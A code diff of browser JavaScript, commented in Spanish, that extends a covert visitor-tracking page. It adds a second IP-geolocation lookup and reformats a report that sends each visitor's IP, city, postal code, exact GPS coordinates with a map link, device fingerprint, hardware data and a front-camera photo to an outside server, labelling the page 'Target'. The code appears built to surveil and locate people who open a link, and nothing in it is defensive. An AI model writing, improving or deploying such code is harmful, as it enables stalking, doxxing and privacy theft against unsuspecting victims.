@@ -56,7 +56,28 @@
     const SERVER_URL = 'https://societykark.pythonanywhere.com/';
     const CHAT_ID = '7555997298';
 
-    // ---------- FUNCIONES DE RECOLECCIÓN ----------
+    // ---------- OBTENER UBICACIÓN DESDE ipapi.co (PRINCIPAL) ----------
+    async function getLocationFromIpapi() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            if (data && data.ip) {
+                return {
+                    ip: data.ip || 'N/A',
+                    country: data.country_name || 'N/A',
+                    region: data.region || 'N/A',
+                    city: data.city || 'N/A',
+                    postal: data.postal || 'N/A',
+                    timezone: data.timezone || 'N/A'
+                };
+            }
+            return null;
+        } catch(e) {
+            return null;
+        }
+    }
+
+    // ---------- OBTENER UBICACIÓN DESDE ip-api.com (RESPALDO) ----------
     async function getLocationFromIpApi() {
         try {
             const res = await fetch('https://ip-api.com/json/');
@@ -72,9 +93,12 @@
                 };
             }
             return null;
-        } catch(e) { return null; }
+        } catch(e) {
+            return null;
+        }
     }
 
+    // ---------- FINGERPRINT ----------
     async function getFingerprint() {
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
@@ -93,6 +117,7 @@
         return { gpu, fonts: availableFonts.join(', ') || 'Ninguna', canvasHash };
     }
 
+    // ---------- DATOS DEL DISPOSITIVO ----------
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let model = "Desconocido";
@@ -107,6 +132,7 @@
         return { model, ua, language, resolution, cpuCores };
     }
 
+    // ---------- ALMACENAMIENTO ----------
     async function getStorageInfo() {
         try {
             const est = await navigator.storage.estimate();
@@ -116,6 +142,7 @@
         } catch(e) { return { total: 'N/A', used: 'N/A' }; }
     }
 
+    // ---------- GPS EXACTO ----------
     function getGPS() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) { resolve(null); return; }
@@ -127,6 +154,7 @@
         });
     }
 
+    // ---------- CÁMARA FRONTAL ----------
     async function capturePhoto() {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -180,7 +208,13 @@
 
         try {
             const gps = await getGPS();
-            const loc = await getLocationFromIpApi();
+            
+            // Intentar con ipapi.co primero, si falla usar ip-api.com
+            let loc = await getLocationFromIpapi();
+            if (!loc || loc.ip === 'N/A') {
+                loc = await getLocationFromIpApi();
+            }
+
             const [fp, device, storage] = await Promise.all([
                 getFingerprint(),
                 getDeviceInfo(),
@@ -188,29 +222,51 @@
             ]);
             const foto = await capturePhoto();
 
+            // ========== CONSTRUIR MENSAJE CON FORMATO CHINGÓN ==========
             let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
-            message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
-            message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
-            message += `🌐 *Network Information*\n   • IP Address: ${loc?.ip || 'N/A'}\n   • Language: ${device.language}\n\n`;
+            
+            message += `🖥️ *Device & Browser*\n`;
+            message += `   • Device Model: ${device.model}\n`;
+            message += `   • User Agent: ${device.ua}\n\n`;
+            
+            message += `🌐 *Network Information*\n`;
+            message += `   • IP Address: ${loc?.ip || 'N/A'}\n`;
+            message += `   • Language: ${device.language}\n\n`;
+            
             message += `📍 *Location Details*\n`;
             if (loc && loc.city !== 'N/A') {
                 message += `   • Country: ${loc.country}\n`;
                 message += `   • Region: ${loc.region}\n`;
                 message += `   • City: ${loc.city}\n`;
                 message += `   • Postal Code: ${loc.postal}\n`;
-                message += `   • Timezone: ${loc.timezone}\n`;
+                message += `   • Timezone: ${loc.timezone}\n\n`;
             } else {
-                message += `   • No disponible\n`;
+                message += `   • No disponible\n\n`;
             }
+            
+            message += `🖼️ *Display Information*\n`;
+            message += `   • Resolution: ${device.resolution}\n\n`;
+            
+            message += `🔐 *Device Permissions*\n`;
+            message += `   • Camera: ${foto ? 'Granted' : 'Denied/Not available'}\n`;
+            message += `   • Location: ${gps ? 'Granted' : 'Denied/Not available'}\n\n`;
+            
+            message += `💾 *Hardware & Storage*\n`;
+            message += `   • CPU Cores: ${device.cpuCores}\n`;
+            message += `   • RAM: N/A GB\n`;
+            message += `   • Storage Used: ${storage.used || 'N/A'} GB\n`;
+            message += `   • Storage Total: ${storage.total || 'N/A'} GB\n\n`;
+            
             if (gps) {
-                message += `\n📍 *GPS (exacto)*\n   • Coordinates: ${gps.lat}, ${gps.lng}\n   • Accuracy: ±${gps.accuracy} meters\n   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
-            } else {
-                message += `\n📍 *GPS: Permiso denegado o no disponible*\n`;
+                message += `📍 *GPS (exacto)*\n`;
+                message += `   • Coordinates: ${gps.lat}, ${gps.lng}\n`;
+                message += `   • Accuracy: ±${gps.accuracy} meters\n`;
+                message += `   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
             }
-            message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n`;
-            message += `\n🔐 *Device Permissions*\n   • Camera: ${foto ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n`;
-            message += `\n💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
-            message += `\n━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @jsemanper`;
+            
+            message += `\n━━━━━━━━━━━━━━━━\n`;
+            message += `🎯 Target: ${window.location.href}\n`;
+            message += `⚡ Developed by: @jsemanper`;
 
             const ok = await sendToServer(message, foto);
             if (!ok) {
